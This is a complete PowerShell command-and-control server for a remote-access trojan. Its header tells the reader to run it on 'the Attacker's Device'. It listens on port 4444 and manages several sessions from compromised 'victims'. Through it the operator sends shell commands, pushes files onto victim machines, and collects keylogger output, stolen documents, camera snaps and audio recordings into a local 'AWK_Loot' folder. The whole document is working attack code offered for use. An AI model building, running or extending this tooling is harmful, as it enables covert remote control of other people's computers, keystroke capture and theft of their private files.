# Execute the following script through Administrator Access of PowerShell in the Attacker's Device to start listening on 4444 Custom Port.
# Added Multi-Device connectivity and interacting options by interact [index] command.




# --- [AWK] MULTI-TITAN MASTER ---
$port = 4444
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
$listener.Start()
$lootBase = "$env:USERPROFILE\Desktop\AWK_Loot"
if (!(Test-Path $lootBase)) { New-Item -ItemType Directory -Path $lootBase | Out-Null }

$Sessions = @{} 
$SessionID = 0

Write-Host "[!] TITAN C2 ONLINE - WL&WJ" -ForegroundColor Cyan
Write-Host "[*] Use 'list' to see victims and 'interact ID' to control." -ForegroundColor Gray

while($true) {
    # 1. NON-BLOCKING LISTENER FOR NEW VICTIMS
    if ($listener.Pending()) {
        $SessionID++; $client = $listener.AcceptTcpClient(); $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        
        # Expecting client to send PC Name as the first line
        $pcName = $reader.ReadLine()
        
        # Create dedicated folder for this victim
        $vFolder = Join-Path $lootBase "Session_$SessionID"
        if (!(Test-Path $vFolder)) { New-Item -ItemType Directory -Path $vFolder | Out-Null }

        $Sessions[$SessionID] = @{ Client=$client; Reader=$reader; Writer=$writer; Name=$pcName; Folder=$vFolder }
        Write-Host "`n[+] NEW SESSION: [$SessionID] ($pcName) connected from $($client.Client.RemoteEndPoint)" -ForegroundColor Green
    }

    # 2. MAIN C2 MENU
    $input = Read-Host "AWK-C2"
    if ($input -eq "list") {
        Write-Host "`nID | Remote Address | Computer Name" -ForegroundColor Yellow
        $Sessions.Keys | % { Write-Host "$_ | $($Sessions[$_].Client.RemoteEndPoint) | $($Sessions[$_].Name)" }
    }
    elseif ($input -like "interact *") {
        $id = [int]$input.Split(" ")[1]
        if ($Sessions.ContainsKey($id)) {
            $s = $Sessions[$id]; Write-Host "[*] Interacting with $id ($($s.Name)). Type 'back' to return." -ForegroundColor Magenta
            
            while($s.Client.Connected) {
                $cmd = Read-Host "AWK-Shell@$id"
                if ($cmd -eq "back") { break }
                
                # --- PUSH LOGIC (INFILTRATION) ---
                if ($cmd -like "push *") {
                    $localPath = $cmd.Substring(5).Trim()
                    if (Test-Path $localPath) {
                        $fName = Split-Path $localPath -Leaf
                        $s.Writer.WriteLine("silent_put")
                        $s.Writer.WriteLine($fName)
                        $s.Writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($localPath)))
                        Write-Host "[*] Pushing $fName..." -ForegroundColor DarkCyan
                    } else { Write-Host "[-] File not found." -ForegroundColor Red; continue }
                } else { $s.Writer.WriteLine($cmd) }
                $s.Writer.Flush()

                # --- UNIVERSAL SYNC & EXTRACTION ENGINE ---
                $isLooting = $false; $lootBuffer = ""; $currentFile = ""
                while ($true) {
                    $line = $s.Reader.ReadLine()
                    if ($line -eq "PS_READY" -or $line -eq $null) { break }
                    
                    # A. HANDLE KEYLOGGER (Prevents corruption during file transfer)
                    if ($line -eq "---K---") {
                        $k = $s.Reader.ReadLine(); $s.Reader.ReadLine() | Out-Null
                        if (!$isLooting) { 
                            $k | Out-File (Join-Path $s.Folder "live_keys.txt") -Append -NoNewline 
                        }
                        continue
                    }

                    # B. DETECT START OF FILE (Snap, Listen, or Pull)
                    if ($line -eq "---START_FILE---" -or $line -match "\.(jpg|wav|docx|txt|pdf|png)$") {
                        # Resolve filename: If START_FILE is used, the next line is the name
                        $currentFile = if ($line -eq "---START_FILE---") { $s.Reader.ReadLine() } else { $line }
                        
                        # Failsafe for empty filenames
                        if ([string]::IsNullOrWhiteSpace($currentFile)) { $currentFile = "loot_$(Get-Date -f HHmmss).bin" }
                        
                        $isLooting = $true; $lootBuffer = ""
                        Write-Host "[*] Receiving Binary Data: $currentFile" -ForegroundColor Cyan
                        continue
                    }

                    # C. DETECT END OF FILE & SAVE
                    if ($line -eq "---END_FILE---" -or $line -eq "---E---" -or $line -eq "---END---") {
                        $isLooting = $false
                        if ($lootBuffer.Length -gt 0) {
                            try {
                                $savePath = Join-Path $s.Folder $currentFile
                                [IO.File]::WriteAllBytes($savePath, [Convert]::FromBase64String($lootBuffer))
                                Write-Host "[+] SUCCESS: File saved to Session_$id folder." -ForegroundColor Green
                            } catch { Write-Host "[-] Failed to save file: $($_.Exception.Message)" -ForegroundColor Red }
                        }
                        $lootBuffer = ""; $currentFile = ""; continue
                    }

                    # D. ACCUMULATE DATA OR PRINT OUTPUT
                    if ($isLooting) { 
                        if ($line -eq "---B---") { continue } # Ignore Snap start-marker
                        $lootBuffer += $line 
                    } else { 
                        Write-Host $line -ForegroundColor Gray 
                    }
                }
            }
        }
    }
    elseif ($input -eq "exit") { break }
}
$listener.Stop()
